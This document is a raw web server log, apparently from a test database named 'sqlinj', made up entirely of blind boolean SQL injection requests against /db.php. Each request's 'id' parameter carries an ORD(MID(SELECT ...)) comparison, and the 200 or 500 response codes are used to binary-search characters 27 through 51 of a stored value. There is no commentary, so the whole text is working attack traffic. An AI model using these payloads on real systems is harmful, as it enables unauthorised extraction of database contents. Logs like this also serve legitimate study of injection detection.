500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),27,1))>102 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),27,1))>101 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),28,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),28,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),28,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),28,1))>116 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),28,1))>114 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),28,1))>113 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),29,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),29,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),29,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),29,1))>108 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),29,1))>110 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),29,1))>111 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),30,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),30,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),30,1))>120 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),30,1))>116 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),30,1))>118 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),30,1))>117 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),31,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),31,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),31,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),31,1))>116 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),31,1))>114 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),31,1))>115 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),32,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),32,1))>48 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),32,1))>72 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),32,1))>84 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),32,1))>90 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),32,1))>93 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),32,1))>94 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),32,1))>95 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),33,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),33,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),33,1))>80 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),33,1))>88 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),33,1))>84 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),33,1))>86 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),33,1))>85 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),34,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),34,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),34,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),34,1))>120 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),34,1))>116 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),34,1))>118 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),34,1))>117 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),35,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),35,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),35,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),35,1))>108 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),35,1))>106 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),35,1))>107 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),36,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),36,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),36,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),36,1))>100 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),36,1))>102 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),36,1))>101 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),37,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),37,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),37,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),37,1))>116 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),37,1))>114 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),37,1))>113 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),38,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),38,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),38,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),38,1))>100 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),38,1))>98 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),38,1))>97 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),39,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),39,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),39,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),39,1))>100 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),39,1))>98 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),39,1))>97 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),40,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),40,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),40,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),40,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),40,1))>106 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),40,1))>105 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),41,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),41,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),41,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),41,1))>108 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),41,1))>106 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),41,1))>107 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),42,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),42,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),42,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),42,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),42,1))>106 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),42,1))>105 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),43,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),43,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),43,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),43,1))>116 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),43,1))>114 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),43,1))>115 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),44,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),44,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),44,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),44,1))>124 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),44,1))>122 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),44,1))>121 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),45,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),45,1))>48 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),45,1))>72 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),45,1))>84 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),45,1))>90 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),45,1))>93 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),45,1))>94 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),45,1))>95 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),46,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),46,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),46,1))>80 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),46,1))>72 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),46,1))>68 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),46,1))>70 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),46,1))>69 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),47,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),47,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),47,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),47,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),47,1))>108 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),47,1))>110 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),47,1))>111 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),48,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),48,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),48,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),48,1))>116 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),48,1))>114 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),48,1))>113 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),49,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),49,1))>48 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),49,1))>72 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),49,1))>84 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),49,1))>90 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),49,1))>93 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),49,1))>94 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),49,1))>95 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),50,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),50,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),50,1))>80 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),50,1))>88 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),50,1))>84 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),50,1))>86 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),50,1))>87 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),51,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),51,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),51,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),51,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),51,1))>100 HTTP/1.1
